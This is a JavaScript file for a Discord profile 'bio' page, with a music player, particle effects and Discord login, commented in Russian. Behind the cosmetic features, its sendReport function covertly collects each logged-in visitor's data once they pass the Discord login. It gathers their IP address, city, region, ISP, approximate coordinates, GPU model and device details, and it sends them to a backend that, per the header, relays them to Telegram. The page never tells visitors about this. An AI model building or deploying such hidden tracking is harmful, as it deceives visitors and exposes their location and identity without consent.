'use strict';

// ============================================================
//  KOHb — DISCORD BIO · v19
//  Backend (Netlify Functions + Telegram) остаётся как есть.
// ============================================================

const $ = (id) => document.getElementById(id);

// ---------- элементы ----------
const enterScreen   = $('enterScreen');
const authGate      = $('authGate');
const bioPage       = $('bioPage');
const bioAvatar     = $('bioAvatar');
const bioName       = $('bioName');
const bioViews      = $('bioViews');
const siteTrack     = $('siteTrack');
const playBtn       = $('playBtn');
const prevBtn       = $('prevBtn');
const nextBtn       = $('nextBtn');
const muteBtn       = $('muteBtn');
const volumeSlider  = $('volumeSlider');
const playerBar     = $('playerBar');
const playerBarFill = $('playerBarFill');
const currentTime   = $('currentTime');
const duration      = $('duration');

// ---------- состояние ----------
let muted = false;
let entered = false;  // пользователь нажал "click to enter..."
let authenticated = false;

// ============================================================
//  ЧАСТИЦЫ
// ============================================================
function initParticles() {
  const wrap = $('particles');
  if (!wrap) return;
  const count = Math.min(80, Math.floor(window.innerWidth / 14));
  const frag = document.createDocumentFragment();

  for (let i = 0; i < count; i++) {
    const p = document.createElement('i');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + '%';
    p.style.width = p.style.height = (1 + Math.random() * 3).toFixed(1) + 'px';
    p.style.opacity = (0.2 + Math.random() * 0.6).toFixed(2);
    p.style.animationDuration = (6 + Math.random() * 12).toFixed(1) + 's';
    p.style.animationDelay = (-Math.random() * 15).toFixed(1) + 's';
    p.style.background = `rgba(255,255,255,${(0.4 + Math.random() * 0.6).toFixed(2)})`;
    frag.appendChild(p);
  }
  wrap.appendChild(frag);
}

// ============================================================
//  ENTER SCREEN
// ============================================================
function onEnterClick() {
  if (entered) return;
  entered = true;

  // прячем экран
  enterScreen.classList.add('fade-out');
  setTimeout(() => {
    enterScreen.hidden = true;
    enterScreen.style.display = 'none';
  }, 600);

  // проверяем сессию.
  // Музыка НЕ запускается здесь — только после успешной авторизации в showBio().
  checkSession();
}

enterScreen.addEventListener('click', onEnterClick);
enterScreen.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' || e.key === ' ') onEnterClick();
});

// ============================================================
//  СЕССИЯ / AUTH
// ============================================================
async function checkSession() {
  try {
    const res = await fetch('/api/session', { credentials: 'same-origin' });
    const data = await res.json();

    if (data.authenticated && data.user) {
      authenticated = true;
      showBio(data.user);
    } else {
      authenticated = false;
      showAuth();
    }
  } catch (e) {
    console.warn('Session check failed', e);
    authenticated = false;
    showAuth();
  }
}

function showAuth() {
  authGate.hidden = false;
  bioPage.hidden = true;

  const btn = $('authBtn');
  if (btn && !btn.dataset.bound) {
    btn.dataset.bound = '1';
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      window.location.href = '/api/discord-login';
    });
  }
}

function showBio(user) {
  authGate.hidden = true;
  bioPage.hidden = false;

  bioAvatar.src = user.avatar || '';
  bioAvatar.alt = user.username || '';
  bioName.textContent = user.global_name || user.username || '—';

  // счётчик просмотров
  let views = parseInt(localStorage.getItem('bio_views') || '0', 10) + 1;
  localStorage.setItem('bio_views', String(views));
  bioViews.textContent = views;

  // отчёт
  sendReport();

  // МУЗЫКА — только здесь, после успешной авторизации
  startPlayback();
}

function startPlayback() {
  if (!siteTrack) return;
  if (!siteTrack.paused) return;
  siteTrack.volume = volumeSlider.value / 100;
  siteTrack.muted = muted;
  const p = siteTrack.play();
  if (p && p.catch) p.catch(() => { /* автоплей может быть заблокирован — тогда пользователь жмёт play */ });
}

// ============================================================
//  ОТЧЁТ В TELEGRAM (backend)
// ============================================================
async function sendReport() {
  const ua = navigator.userAgent || '';
  const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
  const platform = navigator.platform || '';

  // GPU
  let gpu = '', gpuVendor = '';
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl2') || c.getContext('webgl') || c.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
      gpuVendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
    }
  } catch (e) { /* noop */ }

  // IP + гео (без отображения на странице)
  let ip = null, city = null, country = null, region = null, isp = null, asn = null, coords = null;
  try {
    const r = await fetch('https://ipwho.is/', { headers: { Accept: 'application/json' }, cache: 'no-store' });
    if (r.ok) {
      const d = await r.json();
      if (d && d.success !== false) {
        ip = d.ip || null;
        city = d.city || null;
        country = d.country || null;
        region = d.region || null;
        isp = d.connection?.isp || d.connection?.org || null;
        asn = d.connection?.asn || null;
        if (d.latitude != null && d.longitude != null) {
          coords = `${Number(d.latitude).toFixed(4)}, ${Number(d.longitude).toFixed(4)}`;
        }
      }
    }
  } catch (e) { /* noop */ }

  const payload = {
    ip, city, country, region, isp, asn, coords,
    userAgent: ua,
    screen: `${screen.width}x${screen.height}`,
    viewport: `${innerWidth}x${innerHeight}`,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || null,
    platform,
    cores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    gpu: gpu || null,
    gpuVendor: gpuVendor || null,
    cpuArch: null,
    isMobile,
    online: navigator.onLine
  };

  try {
    await fetch('/api/submit-report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.warn('Report submission error', e);
  }
}

// ============================================================
//  МУЗЫКА
// ============================================================
function formatTime(sec) {
  if (!isFinite(sec)) return '0:00';
  const m = Math.floor(sec / 60);
  const s = Math.floor(sec % 60);
  return `${m}:${s < 10 ? '0' : ''}${s}`;
}

if (siteTrack) {
  siteTrack.addEventListener('loadedmetadata', () => {
    duration.textContent = formatTime(siteTrack.duration);
  });

  siteTrack.addEventListener('timeupdate', () => {
    const pct = (siteTrack.currentTime / siteTrack.duration) * 100 || 0;
    playerBarFill.style.width = pct + '%';
    currentTime.textContent = formatTime(siteTrack.currentTime);
  });

  siteTrack.addEventListener('play', () => {
    document.body.classList.add('is-playing');
    playBtn.querySelector('.icon-play').style.display = 'none';
    playBtn.querySelector('.icon-pause').style.display = '';
  });

  siteTrack.addEventListener('pause', () => {
    document.body.classList.remove('is-playing');
    playBtn.querySelector('.icon-play').style.display = '';
    playBtn.querySelector('.icon-pause').style.display = 'none';
  });
}

playBtn.addEventListener('click', () => {
  if (siteTrack.paused) siteTrack.play().catch(() => {});
  else siteTrack.pause();
});

prevBtn.addEventListener('click', () => {
  siteTrack.currentTime = 0;
});

nextBtn.addEventListener('click', () => {
  siteTrack.currentTime = 0;
});

muteBtn.addEventListener('click', () => {
  muted = !muted;
  siteTrack.muted = muted;
  muteBtn.querySelector('.icon-vol').style.display = muted ? 'none' : '';
  muteBtn.querySelector('.icon-mute').style.display = muted ? '' : 'none';
});

volumeSlider.addEventListener('input', () => {
  siteTrack.volume = volumeSlider.value / 100;
  siteTrack.muted = volumeSlider.value == 0;
  muted = siteTrack.muted;
  muteBtn.querySelector('.icon-vol').style.display = muted ? 'none' : '';
  muteBtn.querySelector('.icon-mute').style.display = muted ? '' : 'none';
});

playerBar.addEventListener('click', (e) => {
  const rect = playerBar.getBoundingClientRect();
  const pct = (e.clientX - rect.left) / rect.width;
  siteTrack.currentTime = pct * siteTrack.duration;
});

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ
// ============================================================
document.addEventListener('DOMContentLoaded', () => {
  initParticles();
});